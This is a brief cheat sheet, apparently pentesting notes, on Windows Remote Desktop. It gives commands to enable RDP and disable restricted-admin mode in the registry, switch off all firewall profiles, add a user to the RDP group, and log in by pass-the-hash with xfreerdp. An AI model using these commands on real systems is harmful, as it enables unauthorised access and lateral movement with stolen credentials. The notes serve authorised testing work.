## enable rdp and add user
* users in administrators group and remote desktop users group can RDP into the computer    
```powershell
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f 
netsh advfirewall set allprofiles state off
net localgroup "remote desktop users" <USER.NAME> /add
```

<!-- winrm quickconfig -->
<!-- Enable-PSRemoting -SkipNetworkProfileCheck -Force -->
<!-- l -->

## rdp pass the hash
```shell
# rdp pth may fail due to restricted admin mode
# https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#rdp-restrictedadmin-mode
xfreerdp /u:administrator /d:domain /pth:<NThash> /v:192.168.1.101
```

## connect to rdp
```shell
xfreerdp /u:administrator /p:<password> /v:<ip_address>
```
## shared folder 
```shell
xfreerdp /u:administrator /p:<password> /v:<ip_address> /drive:path/to/directory,share_name
```
## full screen
`CTRL-ALT-ENTER`